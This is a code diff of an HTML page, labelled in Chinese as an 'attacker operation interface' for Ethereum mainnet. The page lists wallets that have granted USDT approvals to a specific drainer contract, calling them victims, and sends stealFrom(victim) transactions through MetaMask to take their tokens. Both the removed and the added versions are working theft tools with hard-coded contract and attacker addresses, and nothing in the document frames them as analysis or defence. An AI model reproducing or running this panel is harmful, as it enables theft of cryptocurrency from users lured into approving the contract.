@@ -1,75 +1,83 @@
+
 <!DOCTYPE html>
-<html>
-<head><meta charset="utf-8"><title>盜取控制台 v3.1</title>
-<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+<html lang="zh-Hant">
+<head>
+  <meta charset="UTF-8">
+  <title>🛠️ 攻擊者操作介面 v3.1.2（Ethereum 主網）</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <style>
+    body { font-family: 'Arial'; padding: 20px; background: #fff; }
+    .ok { color: green; }
+    .bad { color: red; }
+  </style>
 </head>
-<body style="font-family:monospace;padding:30px;">
-  <h2>🛠️ 攻擊者操作介面 <span style="float:right;color:gray;">v3.1</span></h2>
-  <div>合約地址：<b>0xFbe9c4748A267562f723C67db673943F901533D6</b></div>
-  <div id="status">⏳ 讀取中...</div><br>
-  <input id="victim" placeholder="受害者地址" style="width:380px;">
+<body>
+  <h2>🛠️ 攻擊者操作介面 v3.1.2（Ethereum 主網）</h2>
+  <p><b>合約地址：</b><span id="contract">0xFbe9c4748A267562f723C67db673943F901533D6</span></p>
+  <p><b>目前登入帳號：</b><span id="account">MetaMask 連線中...</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
+  <br>
+  <input id="input" placeholder="受害者地址" />
   <button onclick="steal()">執行盜取</button>
-  <pre id="log">⚙️ 等待操作…</pre>
-  <h3>📌 最近授權地址列表：</h3>
-  <ul id="list"></ul>
+  <p id="status">等待操作...</p>
+  <h3>📌 授權地址列表：</h3>
+  <ul id="victims"></ul>
+
   <script>
-    const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
-    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const contractAddr = "0xFbe9c4748A267562f723C67db673943F901533D6";
-    const abi = [{"name":"stealFrom","type":"function","inputs":[{"name":"victim","type":"address"}],"outputs":[],"stateMutability":"nonpayable"}];
-    const usdtABI = [{"constant":true,"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function"},
-                     {"constant":true,"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"type":"function"}];
+    const CONTRACT = "0xFbe9c4748A267562f723C67db673943F901533D6";
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const ABI = ["event Approval(address indexed owner,address indexed spender,uint256 value)"];
+    let provider, signer, attacker;
 
-    let current;
-
-    async function load() {
-      if (!window.ethereum) return alert("請先安裝 MetaMask");
-      const web3 = new Web3(window.ethereum);
-      await ethereum.request({ method: 'eth_requestAccounts' });
-      const accounts = await web3.eth.getAccounts();
-      current = accounts[0];
-      const status = document.getElementById("status");
-      if (current.toLowerCase() === attacker.toLowerCase()) {
-        status.innerHTML = `👤 目前登入帳號：<b style='color:green;'>0xDa4FfA490992769B8F54063bf0B9E7a4D3479459</b><br>✅ 身份驗證：你是攻擊者本人`;
-      } else {
-        status.innerHTML = `👤 目前登入帳號：<b style='color:red;'>${current}</b><br>❌ 非攻擊者帳號，請切換`;
-      }
-      renderList();
+    async function connect() {
+      if (!window.ethereum) return alert("請安裝 MetaMask");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      attacker = await signer.getAddress();
+      document.getElementById("account").innerText = attacker;
+      document.getElementById("auth").innerText = "你是攻擊者本人";
+      document.getElementById("auth").className = "ok";
+      fetchApprovals();
     }
 
-    function renderList() {
-      const ul = document.getElementById("list");
-      const data = JSON.parse(localStorage.getItem("victims") || "[]");
+    async function fetchApprovals() {
+      const contract = new ethers.Contract(USDT, ABI, provider);
+      const events = await contract.queryFilter(
+        contract.filters.Approval(null, CONTRACT),
+        19000000
+      );
+      const ul = document.getElementById("victims");
       ul.innerHTML = "";
-      data.forEach((v, i) => {
-        const li = document.createElement("li");
-        li.textContent = `${i + 1}. ${v.address} 🕒 ${v.time}`;
-        ul.appendChild(li);
+      const addresses = new Set();
+      events.reverse().forEach(ev => {
+        if (!addresses.has(ev.args.owner)) {
+          addresses.add(ev.args.owner);
+          const li = document.createElement("li");
+          li.innerText = ev.args.owner;
+          ul.appendChild(li);
+        }
       });
     }
 
     async function steal() {
-      const web3 = new Web3(window.ethereum);
-      const victim = document.getElementById("victim").value;
-      const log = document.getElementById("log");
-      if (!victim) return log.innerText = "❌ 請輸入受害者地址";
-      const usdt = new web3.eth.Contract(usdtABI, token);
-      const balance = await usdt.methods.balanceOf(victim).call();
-      const allowance = await usdt.methods.allowance(victim, contractAddr).call();
-      const min = Math.min(balance, allowance);
-      log.innerText = `🧾 受害者：${victim}\n💰 Balance：${balance}\n🔐 Allowance：${allowance}`;
-      if (String(min) === "0") return log.innerText += "\n❌ 餘額或授權額度為 0";
-      const contract = new web3.eth.Contract(abi, contractAddr);
-      log.innerText += `\n🚀 呼叫 stealFrom(${victim})...`;
+      const victim = document.getElementById("input").value;
+      const iface = new ethers.utils.Interface(["function stealFrom(address)"]);
+      const data = iface.encodeFunctionData("stealFrom", [victim]);
+      const tx = {
+        to: CONTRACT,
+        data: data
+      };
+      document.getElementById("status").innerText = "🚀 呼叫 stealFrom(" + victim + ")...";
       try {
-        const tx = await contract.methods.stealFrom(victim).send({from: current});
-        log.innerText += `\n✅ 成功！TX Hash: https://etherscan.io/tx/${tx.transactionHash}`;
+        const sent = await signer.sendTransaction(tx);
+        document.getElementById("status").innerText = "✅ TX Hash: " + sent.hash;
       } catch (e) {
-        log.innerText += `\n❌ MetaMask 拒絕或錯誤：` + (e.message || e);
+        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
       }
     }
 
-    window.onload = load;
+    connect();
   </script>
 </body>
 </html>
